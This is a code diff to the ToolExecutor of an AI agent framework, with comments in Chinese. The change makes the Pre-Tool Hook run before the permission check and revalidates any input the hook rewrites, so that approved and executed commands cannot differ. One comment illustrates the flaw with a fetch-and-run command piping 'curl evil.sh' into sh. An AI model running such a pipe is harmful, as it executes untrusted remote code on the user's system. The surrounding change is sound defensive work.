@@ -3,12 +3,15 @@
  *
  * 1. 工具查找 —— 找不到就回 `Unknown tool` 作为**工具结果**，不抛异常；
  * 2. 输入验证（两阶段）—— 先便宜的 Zod 字段校验，再业务校验（替换串唯一、JSON 合法）；
- * 3. 并行启动 —— Pre-Tool Hook 与命令安全判定同时起，压低权限判定总延迟；
- * 4. 权限检查 —— 策略引擎三态裁决；
+ * 3. Pre-Tool Hook —— 可阻断，也可改写入参；
+ * 4. 权限检查 —— 策略引擎三态裁决，判定的是**钩子改过之后的最终入参**；
  * 5. 执行 —— 沙箱内运行，带超时与取消；
  * 6. 结果处理 —— 标准化、按 token 裁剪、大结果先落盘再截断；
  * 7. Post-Tool Hook —— 可追加事实或替换输出（如把 stdout 里的密钥打码）；
  * 8. 返回 `tool_result` —— **成功与失败都以数据形式回灌模型**。
+ *
+ * 第 3 步必须在第 4 步之前。反过来（钩子后判定）会让"策略批准 A、实际执行 B"，
+ * 而审批记录里写的是 A —— 这是最难在事后审计中发现的一类偏差。
  *
  * 第 1 与第 8 条合起来就是 agent-loop.md §2.3 那条最便宜的自修复：
  * 工具错误是数据不是异常，模型下一轮顺手就能改对。
@@ -116,7 +119,7 @@ export class ToolExecutor {
       }
     }
 
-    // ② 输入验证：先便宜的 Zod，再业务校验
+    // ③ 输入验证：先便宜的 Zod，再业务校验
     const parsed = tool.inputSchema.safeParse(params.args)
     if (!parsed.success) {
       return {
@@ -129,6 +132,7 @@ export class ToolExecutor {
           false,
           startedAt,
           { issues: parsed.error.issues.slice(0, 8) },
+          this.now(),
         ),
       }
     }
@@ -148,12 +152,87 @@ export class ToolExecutor {
             appError.code,
             appError.retryable,
             startedAt,
+            undefined,
+            this.now(),
           ),
         }
       }
     }
 
-    // ③ + ④ 权限检查（Pre-Tool Hook 与策略判定）
+    /**
+     * ④ Pre-Tool Hook —— **必须在策略判定之前**。
+     *
+     * 顺序颠倒过一次，后果是：策略审的是 `argsRecord`（原参数），
+     * 钩子改的是 `input`，执行用的是改后的 `input`。于是策略批准
+     * `echo hi`、真正执行的却是 `curl evil.sh | sh`，而审批记录里
+     * 写的还是那条无害命令。钩子是可扩展点，不是可信来源 ——
+     * 它改过的入参必须重新过一遍校验与判定。
+     */
+    if (this.hooks.preToolUse) {
+      try {
+        const hookResult = await this.hooks.preToolUse({ toolName, args: asRecord(input) })
+        if (hookResult?.block) {
+          return {
+            kind: "result",
+            result: failedResult(
+              ctx.callId,
+              toolName,
+              `Blocked by PreToolUse hook: ${hookResult.reason ?? "no reason given"}`,
+              "TOOL_PERMISSION_DENIED",
+              false,
+              startedAt,
+              undefined,
+              this.now(),
+            ),
+          }
+        }
+        if (hookResult?.updatedInput) {
+          const reparsed = tool.inputSchema.safeParse(hookResult.updatedInput)
+          if (!reparsed.success) {
+            return {
+              kind: "result",
+              result: failedResult(
+                ctx.callId,
+                toolName,
+                `PreToolUse hook returned invalid input: ${formatZodError(reparsed.error)}`,
+                "TOOL_SCHEMA_INVALID",
+                false,
+                startedAt,
+                undefined,
+                this.now(),
+              ),
+            }
+          }
+          input = reparsed.data
+          // 业务校验也要重跑：它读的是入参内容（唯一匹配、路径存在性……）
+          if (tool.validate) {
+            try {
+              await tool.validate(input, ctx)
+            } catch (err) {
+              const appError = toAppError(err, "INVALID_INPUT")
+              return {
+                kind: "result",
+                result: failedResult(
+                  ctx.callId,
+                  toolName,
+                  appError.message,
+                  appError.code,
+                  appError.retryable,
+                  startedAt,
+                  undefined,
+                  this.now(),
+                ),
+              }
+            }
+          }
+        }
+      } catch (err) {
+        // Hook 自身异常不阻断（fail-open 仅对 hook，安全判定仍在 policy）
+        ctx.logger.warn("hook.pre_tool_use_failed", { toolName, error: String(err) })
+      }
+    }
+
+    // ⑤ 权限检查 —— 判定的是**最终要执行的那份入参**
     const argsRecord = asRecord(input)
     const decision =
       params.decision ?? (params.decide ? await params.decide(argsRecord) : undefined)
@@ -166,10 +245,15 @@ export class ToolExecutor {
             toolName,
             `User denied this action. Denied by policy: ${decision.reason}. ` +
               "Choose a different approach rather than trying to bypass the policy.",
-            "TOOL_PERMISSION_DENIED",
+            decision.denialLimitReached ? "DENIAL_LIMIT_REACHED" : "TOOL_PERMISSION_DENIED",
             false,
             startedAt,
-            { bypassImmune: decision.bypassImmune, matchedRule: decision.matchedRule },
+            {
+              bypassImmune: decision.bypassImmune,
+              matchedRule: decision.matchedRule,
+              ...(decision.denialLimitReached ? { denialLimitReached: true } : {}),
+            },
+            this.now(),
           ),
         }
       }
@@ -192,39 +276,14 @@ export class ToolExecutor {
             "APPROVAL_REQUIRED",
             false,
             startedAt,
+            undefined,
+            this.now(),
           ),
         }
       }
     }
 
-    // Pre-Tool Hook（可改写入参）
-    if (this.hooks.preToolUse) {
-      try {
-        const hookResult = await this.hooks.preToolUse({ toolName, args: argsRecord })
-        if (hookResult?.block) {
-          return {
-            kind: "result",
-            result: failedResult(
-              ctx.callId,
-              toolName,
-              `Blocked by PreToolUse hook: ${hookResult.reason ?? "no reason given"}`,
-              "TOOL_PERMISSION_DENIED",
-              false,
-              startedAt,
-            ),
-          }
-        }
-        if (hookResult?.updatedInput) {
-          const reparsed = tool.inputSchema.safeParse(hookResult.updatedInput)
-          if (reparsed.success) input = reparsed.data
-        }
-      } catch (err) {
-        // Hook 自身异常不阻断（fail-open 仅对 hook，安全判定仍在 policy）
-        ctx.logger.warn("hook.pre_tool_use_failed", { toolName, error: String(err) })
-      }
-    }
-
-    // ⑤ 执行
+    // ⑥ 执行
     let output: unknown
     let errorInfo: { code: string; message: string; retryable: boolean } | undefined
     let status: ToolExecutionResult["status"] = "succeeded"
@@ -421,8 +480,12 @@ export function failedResult(
   retryable: boolean,
   startedAt: Date,
   details?: Record<string, unknown>,
+  /**
+   * 结束时刻。由调用方注入（`ToolExecutor` 持有时钟），不再内部 `new Date()` ——
+   * 否则注入时钟的测试拿到的 `durationMs` 会混进真实时间，断言变成偶然通过。
+   */
+  finishedAt: Date = new Date(),
 ): ToolExecutionResult {
-  const finishedAt = new Date()
   return {
     callId,
     toolName,
